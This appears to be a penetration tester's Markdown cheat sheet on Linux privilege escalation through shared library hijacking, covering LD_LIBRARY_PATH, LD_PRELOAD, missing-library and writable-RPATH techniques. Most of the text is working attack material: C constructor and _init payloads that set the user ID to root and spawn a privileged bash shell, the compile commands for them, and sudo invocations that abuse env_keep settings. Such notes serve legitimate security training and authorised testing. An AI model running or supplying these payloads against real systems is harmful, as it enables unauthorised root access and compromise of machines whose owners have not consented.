---
tags:
  - Exploitation
  - Foundational
  - Linux
  - Post_Exploitation
---

## Shared Library Theory
resources: [HackTricks - Linux PrivEsc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

> [!info] Linux executables load shared libraries (.so files) at runtime. Hijacking library loading can lead to code execution.

### Library Search Order
> [!important] Library search order (exploitable priority):
> 1. RPATH/RUNPATH embedded in binary
> 2. **LD_LIBRARY_PATH** environment variable
> 3. /etc/ld.so.cache
> 4. /lib and /usr/lib

### Find Binary's Required Libraries [Remote]
```bash
ldd /path/to/binary
```

### Check for RPATH [Remote]
```bash
readelf -d /path/to/binary | grep -i rpath
objdump -x /path/to/binary | grep -i rpath
```

## LD_LIBRARY_PATH Hijacking

### When Exploitable
> [!tip] Exploitable conditions:
> - Binary is SUID/SGID
> - Process runs with elevated privileges
> - **LD_LIBRARY_PATH** is used in sudo command

### Check Sudo LD_LIBRARY_PATH [Remote]
```bash
sudo -l
# Look for env_keep+=LD_LIBRARY_PATH
```

### Create Malicious Library [Remote]
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

### Compile Malicious Library [Remote]
```bash
gcc -shared -fPIC -o libhijack.so hijack.c
```

### Exploit with LD_LIBRARY_PATH [Remote]
```bash
sudo LD_LIBRARY_PATH=/tmp /path/to/vulnerable/binary
```

## LD_PRELOAD Exploitation

### When Exploitable
> [!danger] Highly privileged attack when:
> - sudo allows **env_keep+=LD_PRELOAD**
> - Can run any command with sudo

### Check for LD_PRELOAD in Sudo [Remote]
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD
```

### Create LD_PRELOAD Payload [Remote]
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

### Compile LD_PRELOAD Library [Remote]
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

### Exploit with LD_PRELOAD [Remote]
```bash
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/any_allowed_command
```

## Missing Library Hijacking

### Find Missing Libraries [Remote]
```bash
ldd /path/to/binary 2>&1 | grep "not found"
```

### Check for Writable Library Paths [Remote]
```bash
find / -writable -type d 2>/dev/null | grep -E "(lib|lib64)"
```

### Check ld.so.conf [Remote]
```bash
cat /etc/ld.so.conf
cat /etc/ld.so.conf.d/*
```

### Exploit Missing Library [Remote]
```bash
# If binary looks for libmissing.so
# and /tmp is in library path
gcc -shared -fPIC -o /tmp/libmissing.so malicious.c
```

## RPATH Exploitation

### Find Writable RPATH Directories [Remote]
```bash
# Check if RPATH directory is writable
readelf -d /path/to/suid-binary | grep RPATH
ls -la /path/from/rpath/
```

### Exploit Writable RPATH [Remote]
```bash
# Place malicious .so in RPATH directory
cp /tmp/malicious.so /vulnerable/rpath/directory/libtarget.so
/path/to/suid-binary
```
